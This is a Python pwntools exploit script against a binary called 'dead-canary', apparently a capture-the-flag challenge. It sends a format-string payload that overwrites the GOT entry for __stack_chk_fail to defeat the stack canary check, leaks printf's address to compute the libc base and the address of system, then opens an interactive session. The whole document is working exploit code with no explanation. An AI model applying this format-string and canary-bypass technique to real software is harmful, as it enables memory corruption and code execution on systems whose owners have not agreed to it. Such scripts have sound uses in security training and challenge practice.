from pwn import *

elf = ELF("./dead-canary")
libc = elf.libc

p = process(elf.path)
p.recvuntil(": ")

fmt = "%064x"
fmt += "%11$n" 
fmt += "%01783x"
fmt += "%12$hn"
fmt += "%13$s"
fmt += "BBBBBBBBBBB\x00"
fmt += p64(elf.got.__stack_chk_fail + 2)
fmt += p64(elf.got.__stack_chk_fail)
fmt += p64(elf.got.printf) 
fmt += "C"*(272-len(fmt))

log.info("payload size : %s" % str(len(fmt)))
log.info("payload : %s" % fmt)

p.sendline(fmt)
data =  p.recvuntil(":")

data = data.strip().split("BBBB")[0].split("0")[-1]
l_printf = u64(data.ljust(8, "\x00"))
b_libc = l_printf - libc.sym.printf
libc.address = b_libc

log.info("leak printf: %s" % hex(l_printf))
log.info("leak libc  : %s" % hex(b_libc))
log.info("leak system: %s" % hex(libc.sym.system))

p.interactive()

